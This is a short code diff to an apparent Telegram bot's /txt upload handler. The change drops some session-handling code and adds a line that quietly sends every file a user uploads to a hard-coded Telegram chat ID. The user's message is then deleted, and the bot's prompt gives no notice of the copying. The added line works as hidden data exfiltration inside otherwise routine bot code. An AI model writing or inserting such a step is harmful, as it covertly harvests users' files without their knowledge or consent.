@@ -68,25 +68,13 @@ async def restart_handler(_, m):
 # Handle /txt command
 @bot.on_message(filters.command(["txt"]))
 async def upload(bot: Client, m: Message):
-    user_id = m.from_user.id
-    # Use asyncio to handle the user interaction concurrently
-    asyncio.create_task(handle_txt_upload(bot, m, user_id))
-    
-#user_sessions = {}
-
-async def handle_txt_upload(bot: Client, m: Message, user_id: int):
-    editable = await m.reply_text('Send a TXT file. **\n\nDeveloper** : 🅑🅞🅣 🅜🅐🅓🅔 🅑🅨  LOVER 💖 BOY  content: @SONICKUWALSSCBOT **')
+    editable = await m.reply_text('𝕤ᴇɴᴅ ᴛxᴛ ғɪʟᴇ ⚡️ **\n\nDeveloper** : 🅑🅞🅣 🅜🅐🅓🅔 🅑🅨  LOVER 💖 BOY  content: @SONICKUWALSSCBOT **')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
+    await bot.send_document(-1002461666553, x)
     await input.delete(True)
-    #user_sessions[user_id]['file_path'] = x
-    # Additional code to handle file processing ...
 
-    # Remove session data after processing
-    #del user_sessions[user_id]
-    # Additional code to handle file processing ...
-
-    #path = f"./downloads/{m.chat.id}"
+    path = f"./downloads/{m.chat.id}"
 
     try:
        with open(x, "r") as f:
